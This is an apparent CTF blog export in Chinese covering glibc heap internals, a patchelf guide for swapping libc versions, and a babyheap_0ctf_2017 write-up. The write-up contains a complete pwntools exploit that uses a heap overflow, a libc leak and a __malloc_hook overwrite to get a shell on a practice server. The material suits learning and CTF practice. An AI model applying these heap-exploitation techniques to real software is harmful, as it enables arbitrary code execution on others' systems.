<li>在2.23版本中可以使用unsortedbin attack（修改unsortedbin中的FD字段为0，BK字段为target addr - 0x10），在那边写入unsortedbin地址，从而拥有了0x7f（使用过之后如果fastbin里面没有chunk，那么申请堆块会到unsortedbin里面去找，找的话就会报错，此时需要到main_arena对应地址去修复unsortedbin的指针，改回原来的样子）</li>
<li>劫持top chunk，生成一个fastchunk释放掉，接着把fd指针修改为fastchunk的大小（如写入0x81），然后再把刚才释放的堆块申请出来，此时会在main_arena生成出一个0x81，可以通过fastchunk的检查，而在这个下方，就是top chunk的指针，把指针内容修改到目标地址前面的地址（地址需要符合top size），然后再申请堆块即可（此时不可以存在被释放的堆块，要让堆块是从top chunk中分配的）</li>
</ul>
<p>20、绕过calloc的清空数据：把堆的is_mmap位置改为1，calloc将不会清空属于mmap的堆块数据</p>
<p>顺序：释放==&gt;修改堆头==&gt;申请堆块</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>堆调试——更换libc</title>
    <url>/2021/04/17/2021-04-17-%E5%A0%86%E8%B0%83%E5%BC%8F%E2%80%94%E2%80%94%E6%9B%B4%E6%8D%A2libc/</url>
    <content><![CDATA[<p><strong>转载自：<a href="https://blog.csdn.net/qq_41560595/article/details/114597342">https://blog.csdn.net/qq_41560595/article/details/114597342</a></strong></p>
<p>在做堆实验时，高版本的glibc所含的tcache会对调试产生影响。下面安装不同版本的glibc.<br>下面以安装2.23版本为例：</p>
<h3 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h3><p><strong>patchelf</strong><br>git clone <a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p>
<p><strong>glibc-all-in_one</strong><br>git clone <a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
<h3 id="64位程序"><a href="#64位程序" class="headerlink" title="64位程序"></a>64位程序</h3><h4 id="1-安装glibc-all-in-one"><a href="#1-安装glibc-all-in-one" class="headerlink" title="1. 安装glibc-all-in_one"></a>1. 安装glibc-all-in_one</h4><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./update_list             <span class="hljs-comment">#更新最新版本的glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> cat list                 <span class="hljs-comment">#查看可下载的glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./download 2.23-0ubuntu11.2_amd64        <span class="hljs-comment">#glibc为你想要下载glibc的名字</span></span><br></code></pre></td></tr></table></figure>

<h4 id="2-安装patchelf"><a href="#2-安装patchelf" class="headerlink" title="2. 安装patchelf"></a>2. 安装patchelf</h4><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./bootstrap.sh<br>./configure<br>make<br>sudo make install<br>make check<br></code></pre></td></tr></table></figure>

<p>可能会遇到 <code>autoreconf: not found</code>的报错</p>
<p>安装一下就好</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get install autoconf automake libtool<br></code></pre></td></tr></table></figure>

<h4 id="3-生成所需的符号链接"><a href="#3-生成所需的符号链接" class="headerlink" title="3.生成所需的符号链接"></a>3.生成所需的符号链接</h4><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"><span class="hljs-built_in">cd</span> /libs  <span class="hljs-comment">#进入libs的目录</span></span>  <br><span class="hljs-meta">$</span><span class="bash"> sudo su    <span class="hljs-comment">#进入root态</span></span><br><span class="hljs-meta">$</span><span class="bash"> ln -s /home/pwn/桌面/tools/glibc-all-in_one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so ./23_11-linux.so.2</span><br><span class="hljs-meta">#</span><span class="bash">./23_11-linux.so.2是自己起的名。23代表glibc版本,11代表ubuntu后面的数字(单纯为了好记)</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l <span class="hljs-comment">#可以看到生成的符号链接</span></span><br></code></pre></td></tr></table></figure>

<p>文件路径要注意修改为自己的路径</p>
<h4 id="4-更改elf文件的ld和libc"><a href="#4-更改elf文件的ld和libc" class="headerlink" title="4.更改elf文件的ld和libc"></a>4.更改elf文件的ld和libc</h4><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> patchelf --set-interpreter /lib64/23_11-linux.so.2 ./chunk_extend_2</span><br><span class="hljs-meta">$</span><span class="bash"> patchelf --replace-needed libc.so.6 /home/pwn/桌面/tools/glibc-all-in_one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so ./chunk_extend_2</span><br><span class="hljs-meta">#</span><span class="bash">libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    chunk_extend_2 是二进制文件</span><br><span class="hljs-meta">$</span><span class="bash"> ldd ./bin <span class="hljs-comment">#查看elf的ld和libc</span></span><br></code></pre></td></tr></table></figure>

<h3 id="我自己调式情况："><a href="#我自己调式情况：" class="headerlink" title="我自己调式情况："></a>我自己调式情况：</h3><p><img src="2021-04-17-%E5%A0%86%E8%B0%83%E5%BC%8F%E2%80%94%E2%80%94%E6%9B%B4%E6%8D%A2libc.assets/QQ%E5%9B%BE%E7%89%8720210418121652.png"></p>
<p>首先，这是还未更换的文件的ld和libc</p>
<p>当输入<code>patchelf --replace-needed libc.so.6 /home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc.so.6 1</code>时</p>
<p><img src="2021-04-17-%E5%A0%86%E8%B0%83%E5%BC%8F%E2%80%94%E2%80%94%E6%9B%B4%E6%8D%A2libc.assets/QQ%E5%9B%BE%E7%89%8720210418122225.png"></p>
<p>可以发现，libc.so.6的路径被更换了，换为了glibc-all-in-on目录下的libc.so.6，本来按照上面的来讲，总共是要两步的，先是更换链接器，然后改变libc路径。但是我直接去修改libc的路径，得到的结果是跟上述是一样的，已经完成了修改。</p>
<p><img src="2021-04-17-%E5%A0%86%E8%B0%83%E5%BC%8F%E2%80%94%E2%80%94%E6%9B%B4%E6%8D%A2libc.assets/QQ%E5%9B%BE%E7%89%8720210418122806.png"></p>
<p>去修改链接器，最终指向的仍然是<code>/lib64/ld-linux-x86-64.so.2</code> 并没有在本质上改变了什么</p>
<p>结论为：暂时不知道是因为什么，不过还是建议按上面步骤来</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>堆入门题</title>
    <url>/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/</url>
    <content><![CDATA[<h1 id="纪念"><a href="#纪念" class="headerlink" title="纪念"></a>纪念</h1><p>第一次学习堆，特意为这题单发一个博客好了。作为接触堆的一个分界线吧！</p>
<h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210410075150.png"></p>
<p>照例checksec以及运行，发现开启了全部的缓解机制。进入ida静态分析，了解一下具体运行情况。审计一下其中的代码</p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210414212529.png"></p>
<p>在main函数里面，可以看到分为了众多函数，首先v4是一个指针，其次他的值来自于sub_B70，我们要进入这个函数查看一番，返回了什么地址，并赋值给了v4</p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210414212357.png"></p>
<p>在sub_B70这个函数中，调用了mmap函数，开辟了一段匿名映射区。该映射区起始地址为addr，长度为0x1000，权限为可写可执行，用于<strong>存放最多16个结构体。每个结构体包含in_use、size和buf_ptr三个域，分别表示堆块是否在被使用、堆的大小和指向堆块缓冲区的指针。</strong> 而函数sub_B70便是把这个匿名映射的地址返回给了v4。</p>
<p>接下来两个函数，一个是用来输出选项的字符串，一个是用来输入的，输入长度被限制为8个字节，就不细讲了。以及注意后面执行的四个函数，都是把v4指向的地址作为参数进入到函数中去。</p>
<img src="2021-04-13-堆入门题.assets/QQ图片20210428230535.png" style="zoom:80%;" />

<p>这是1.Allocate函数的代码，首先是在之前mmap申请的16个结构体中找到一个未被使用过的结构体，然后再要我们输入一个数，生成该数数值大小的一个堆，不能超过0x1000。</p>
<img src="2021-04-13-堆入门题.assets/QQ图片20210428231105.png" style="zoom:80%;" />

<p>这是2.Fill函数。首先读取一个数作为索引，并判断该对应的结构体是否被使用了。如果被使用了，则读取第二个数作为size，并且调用函数sub_11B2，把对应的结构体的buf_ptr指针和size作为参数。</p>
<img src="2021-04-13-堆入门题.assets/QQ图片20210428231148.png" style="zoom:80%;" />

<p>进入到sub_11B2函数中，可以很明显的得知，我们可以向Fill函数中的结构体buf_ptr指针指向的堆输入size个字符，不过只能输入一次。这里的read函数，对size大小并没限制，造成明显的溢出点，后面可以利用</p>
<img src="2021-04-13-堆入门题.assets/QQ图片20210428231209.png" style="zoom:80%;" />

<p>这是3.Free函数。首先读取一个数作为索引，并找到索引对应的结构体，如果该结构体被使用了，就把该结构体指向的堆释放了，同时把in_use、size和buf_ptr全部清零。</p>
<img src="2021-04-13-堆入门题.assets/QQ图片20210428231232.png" style="zoom:80%;" />

<p>最后一个dump函数。首先读取一个数作为索引，找到对应的结构体，如果被使用则调用函数sub_130F，把该结构体的buf_ptr和size两个域作为参数传入。这个函数就不再多介绍，与Fill中的函数类似，仅仅是把read换成了write，把堆的内容写到标准输出。</p>
<p>代码到此就审计完了，回顾整个代码，可以发现，在calloc申请堆的长度是不大于4096的，而在Fill中的read读取长度很明显可以大于4096，而造成堆溢出，这就是本题的漏洞点，之后的思考在于怎么利用这个堆溢出。</p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210418155849.png"></p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210418162040.png"></p>
<p>首先，我们先创建五个chunk，四个是fast chunk，还有一个为small chunk。fast chunk通过fastbin来重叠chunk，small chunk用来获取libc_base。我们把chunk1和chunk2释放掉，根据fastbin后进先出的机制，我们只要再次申请同等大小的chunk，即可把原本释放掉的chunk“归还”回来。因为后面要通过chunk4获取libc偏移，所以我们要在chunk4上面重叠chunk2造成拥有两个指针都可以访问chunk4的地址，才能在把chunk4释放掉之后，仍然可以读取其值。所以接下来要把chunk2的fd的值改为指向chunk4即可。</p>
<p>因为刚开始申请空间时，调用了mmap，那么就可以保证chunk是从堆的起始地址开始分配的，也就是后三位是0x000开始的。那我们修改fd只需要把其修改其最后两位为0x80就可以。因为fast bin的大小有限制，所以还要一起把chunk4的size大小改为21。</p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210418162937.png"></p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210418163044.png"></p>
<p>这是把chunk4释放掉之后，可以看见其fd和bk都指向同一个地址，而这个地址是处于libc里面的地址，所以可以通过这个算出相对于libc起始地址的偏差，因为开启了pie保护，所以libc起始地址是会改变的，但是偏移却是一定的。</p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210418163308.png"></p>
<p>计算可知，偏移为0x3c4b78。偏移到手了，代表着one_gadget的绝对地址也已经有了，接下来就是找到个可以执行程序的东西，对ong_gadget执行即可获取shell。这里我们使用劫持__malloc_hook函数，这个函数是一个弱类型的函数指针，指向void *function(size_t size,void *caller)。当调用malloc函数的时候，会先判断hook函数指针是否为空，如果不为空，就调用它。所以我们要把hook函数指针修改为one_gadget的地址，进行调用one_gadget</p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210418170734.png"></p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210418171155.png"></p>
<p>第二行就是我们需要覆盖的值，所以，我们要在他的前面创建chunk，然后堆溢出覆盖到目标地址。但是前面的数值过于巨大，fast bin的大小不过才0x20~0x80而已，所以这里要利用一个小技巧：错位偏移。即是不要对准内存，而这内存进行偏移0xd个位置，把开头的7f移动到末位，从而能申请到fast chunk。</p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210418175210.png"></p>
<p><img src="2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210418175119.png"></p>
<p>而在这里申请chunk跟之前差不多，先把之前释放的chunk4申请回来，作为fast chunk，我是申请了0x60的大小。然后再释放掉，归到fast bin去，然后通过2来修改其fd的值，去指向malloc_hook附近的地址，然后申请两次同样大小的chunk，第二个chunk就会在我们想要的地址。这里的偏移输入，因为先在hook的位置上移0x20-0xd处建chunk，那么前0x10用来标记，后面的才是存放数据，也就是我们输入数据的起始位置距离hook函数指针的偏移为0x10-0xd=0x3，相差3个字节，所以我们要用p(8)*3先填充这个偏差，然后才是真正的hook函数指针地址，再写入one_gadget的地址即可。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25412</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendlineafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.recvline()<br>	<span class="hljs-keyword">return</span> p.recvline() <span class="hljs-comment">#接收堆中内容</span><br><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk0</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk1</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk2</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk3</span><br>allocate(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#chunk4</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,payload)<br><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk1</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#在chunk4上叠上了chunk2</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,payload)<br>allocate(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#chunk5，防止chunk4与top chunk合并</span><br>free(<span class="hljs-number">4</span>)<br>leak_base=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>])<br>libc_base=leak_base-<span class="hljs-number">0x3c4b78</span><br>malloc_hook=libc_base+<span class="hljs-number">0x3c4b10</span><br>log.info(<span class="hljs-string">&quot;leak address:0x%x&quot;</span> %leak_base)<br>log.info(<span class="hljs-string">&quot;libc base:0x%x&quot;</span> %libc_base)<br>log.info(<span class="hljs-string">&quot;__malloc_hook:0x%x&quot;</span> %malloc_hook)<br><br>allocate(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">4</span>)<br>payload=p64(malloc_hook-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>fill(<span class="hljs-number">2</span>,payload)<br>allocate(<span class="hljs-number">0x60</span>)<br><br>allocate(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#malloc附近的chunk6</span><br>one_gadget=libc_base+<span class="hljs-number">0x4526a</span><br><br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(one_gadget)<br>fill(<span class="hljs-number">6</span>,payload)<br>allocate(<span class="hljs-number">0x1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<p>结语：总算艰苦的完成了第一道的堆题，其中的艰难就不再多说了。更多的还是喜悦吧，万事开头难，跨入了这道坎，后面可能也许大概会容易些吧</p>
]]></content>
  </entry>
  <entry>
    <title>Chunk与Bins分类</title>
    <url>/2021/04/11/2021-04-11-Chunk%E4%B8%8EBins%E5%88%86%E7%B1%BB/</url>
    <content><![CDATA[<p>转载自知乎堆漏洞挖掘——带你了解Chunk分类与Bins分类<a href="https://zhuanlan.zhihu.com/p/363099281">https://zhuanlan.zhihu.com/p/363099281</a></p>
<h2 id="一、Chunk分类"><a href="#一、Chunk分类" class="headerlink" title="一、Chunk分类"></a>一、Chunk分类</h2><p><img src="/2021/04/11/2021-04-11-Chunk%E4%B8%8EBins%E5%88%86%E7%B1%BB/v2-9d7ce923746f4cdf8f8b25481767b3f3_720w.jpg"><span class="image-caption">img</span></p>
<ul>
<li><p>此图是在上篇文章介绍arena时用到的，我们可以看到：堆块被分为不同的种类，下面我们将来介绍这些。</p>
</li>
<li><p>每一类就是一个malloc_chunk结构体，因为这些chunk同属于一个堆块，所以在一块连续的内存中，只是通过区域中特定位置的某些标识符加以区分。</p>
</li>
<li><p>glibc给我们申请的堆块主要分为以下几类：</p>
</li>
<li><ul>
<li><strong>allocated chunk。</strong></li>
<li><strong>free chunk。</strong></li>
<li><strong>top chunk。</strong></li>
<li><strong>Last remainder chunk。</strong></li>
</ul>
</li>
<li><p>为了简便，我们将4个种类的chunk划分为2个种类的chunk，这两个种类的chunk才是我们平常口头上所使用到的：</p>
</li>
<li><ul>
<li><strong>allocated chunk：</strong>当前chunk是被应用层用户所使用的。</li>
<li><strong>free chunk：</strong>当前chunk是空闲的，没有被应用层用户所使用。</li>
</ul>
</li>
</ul>
<h3 id="Top-Chunk："><a href="#Top-Chunk：" class="headerlink" title="Top Chunk："></a>Top Chunk：</h3><ul>
<li><strong>概念：</strong>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。</li>
<li><strong>作用：</strong>该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。</li>
<li><strong>分配的规则：</strong>如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</li>
</ul>
<h3 id="Last-Remainder-Chunk："><a href="#Last-Remainder-Chunk：" class="headerlink" title="Last Remainder Chunk："></a>Last Remainder Chunk：</h3><ul>
<li><strong>它是怎么产生的：</strong>当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，<strong>再将该新的chunk变成新的last remainder chunk。</strong></li>
<li><strong>它的作用是什么：</strong>此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。</li>
<li>详情见文章：<a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_41453285/article/details/97803141">https://blog.csdn.net/qq_41453285/article/details/97803141</a>。</li>
</ul>
<h2 id="二、bin链的介绍与bin链分类"><a href="#二、bin链的介绍与bin链分类" class="headerlink" title="二、bin链的介绍与bin链分类"></a>二、bin链的介绍与bin链分类</h2><ul>
<li><p>bin是一个由struct chunk结构体组成的链表。</p>
</li>
<li><p>前面介绍过，不同的chunk根据特点不同分为不同的chunk，为了将这些chunk进行分类的管理，glibc采用了bin链这种方式管理不同的chunk。</p>
</li>
<li><p>不同的bin链是由arena管理的。</p>
</li>
<li><p>bin链中的chunk均为<strong>free chunk</strong>。</p>
</li>
<li><p>根据bin链成员的大小不同，分为以下几类：</p>
</li>
<li><ul>
<li>fast bin是单链表，其他都是双向链表。</li>
<li><strong>Fast bin。</strong></li>
<li><strong>Unsorted bin。</strong></li>
<li><strong>Small bin。</strong></li>
<li><strong>Large bin。</strong></li>
</ul>
</li>
</ul>
<h2 id="三、bin链的保存（struct-malloc-state结构体）"><a href="#三、bin链的保存（struct-malloc-state结构体）" class="headerlink" title="三、bin链的保存（struct malloc_state结构体）"></a>三、bin链的保存（struct malloc_state结构体）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">typedef struct malloc_chunk* mchunkptr;<br>typedef struct malloc_chunk *mfastbinptr;<br> <br> <br>struct malloc_state<br>&#123; <br>  ...<br>  /*other member*/<br>  ...<br> <br>  /* Fastbins */<br>  mfastbinptr fastbinsY[NFASTBINS];<br> <br>  /* Normal bins packed as described above */<br>  mchunkptr bins[NBINS * 2 - 2];<br> <br>  ...<br>  /*other member*/<br>  ...<br>&#125;; <br></code></pre></td></tr></table></figure>

<ul>
<li><p>前面说过，不同的bin链是由arena管理的。因此一个线程中会有很多的bin链，这些bin链都有arena所表示的struct malloc_state结构体的以下成员保存：</p>
</li>
<li><ul>
<li><strong>fastbinY数组：</strong>大小为10。记录的是fast bin链。</li>
<li><strong>bins数组：</strong>大小为129。记录的是unsorted bin（1）、small bin（2<del>63）、large bin链（64</del>126）。</li>
</ul>
</li>
</ul>
<p><img src="/2021/04/11/2021-04-11-Chunk%E4%B8%8EBins%E5%88%86%E7%B1%BB/v2-1c456be35efc37e943afa83fb29bb29c_720w.jpg"><span class="image-caption">img</span></p>
<ul>
<li><strong>数组存储bin链的结构，见文章：</strong><a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_41453285/article/details/97613588">https://blog.csdn.net/qq_41453285/article/details/97613588</a>。</li>
</ul>
<h2 id="四、Fast-Bin"><a href="#四、Fast-Bin" class="headerlink" title="四、Fast Bin"></a>四、Fast Bin</h2><ul>
<li><strong>概念：</strong>chunk的大小在32字节<del>128字节（0x20</del>0x80）的chunk称为“fast chunk”（大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员）。</li>
<li>fast bin链表的个数为10个。</li>
<li><strong>不会对free chunk进行合并：</strong>鉴于设计fast bin的初衷就是进行快速的小内存分配和释放，因此系统将属于fast bin的chunk的PREV_INUSE位<strong>总是设置为1</strong>，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。</li>
</ul>
<h3 id="fastbinsY数组存储fastbins的规则"><a href="#fastbinsY数组存储fastbins的规则" class="headerlink" title="fastbinsY数组存储fastbins的规则"></a>fastbinsY数组存储fastbins的规则</h3><ul>
<li>每个fast bin链表都是单链表（使用fd指针）。因此，fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作。</li>
<li>单个fastbin链表中的chunk大小都是相同的，各个fastbin链表中的chunk大小是不同的。</li>
<li>fastbinY数组中的每个bin链表的排序，是按照链表元素的大小进行排序的。数组的第一个元素的fast bin链表中的每个chunk的大小是32字节的，数组的第二个元素的fast bin链表中的每个chunk的大小是48字节的……每个元素都比前面的fast bin链大16字节，以此类推进行排序。</li>
</ul>
<p><img src="/2021/04/11/2021-04-11-Chunk%E4%B8%8EBins%E5%88%86%E7%B1%BB/v2-4be067bab2e304c104678811064657df_720w.jpg"><span class="image-caption">img</span></p>
<h3 id="链表索引宏定义：（fastbin-index）"><a href="#链表索引宏定义：（fastbin-index）" class="headerlink" title="链表索引宏定义：（fastbin_index）"></a>链表索引宏定义：（fastbin_index）</h3><ul>
<li><strong>功能：</strong>通过此宏能判断某一个fastchunk属于哪一个fastbin链表。</li>
<li><strong>参数：</strong>某一个chunk的大小。</li>
</ul>
<p><img src="/2021/04/11/2021-04-11-Chunk%E4%B8%8EBins%E5%88%86%E7%B1%BB/v2-0709536f14aa2206dbe2fd972806b40f_720w.png"><span class="image-caption">img</span></p>
<p><strong>malloc操作与fastbins的初始化：</strong></p>
<ul>
<li><p>当应用层通过malloc函数<strong>第一次</strong>申请的chunk属于16字节~80字节之间时，因为初始化的时候fast bin支持的最大内存大小以及所有fast bin链表都是空的，所以它也不会交由fast bin来处理，而是向下传递交由small bin来处理，如果small bin也为空的话就交给unsorted bin处理。</p>
</li>
<li><p><strong>那么，fast bin如何进行初始化哪？</strong></p>
</li>
<li><ul>
<li><p>当我们第一次调用malloc(fast bin)的时候，系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化。malloc_consolidate函数主要完成以下几个功能：</p>
</li>
<li><ul>
<li>a.首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。</li>
<li>b.malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins，再初始化fast bins。</li>
</ul>
</li>
<li><p>那么当再次执行malloc(fast chunk)函数的时候，此时fast bin相关数据不为空了，就可以使用fast bin。</p>
</li>
</ul>
</li>
</ul>
<h3 id="free操作"><a href="#free操作" class="headerlink" title="free操作"></a>free操作</h3><ul>
<li>这个操作很简单，主要分为两步：先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小；然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。</li>
</ul>
<h2 id="五、Unsorted-Bin"><a href="#五、Unsorted-Bin" class="headerlink" title="五、Unsorted Bin"></a>五、Unsorted Bin</h2><ul>
<li><p><strong>何时使用：</strong>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。</p>
</li>
<li><p><strong>目的：</strong>这主要是为了让“glibc malloc机制”能够有第二次机会重新利用最近释放的chunk(第一次机会就是fast bin机制)。利用unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的bin了。</p>
</li>
<li><p><strong>Unsorted bin的特性如下：</strong></p>
</li>
<li><ul>
<li>unsorted bin的个数： 1个。</li>
<li>unsorted bin是一个由free chunks组成的循环双链表。</li>
<li>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。</li>
<li>unsortedbin采用的遍历顺序是FIFO。</li>
</ul>
</li>
</ul>
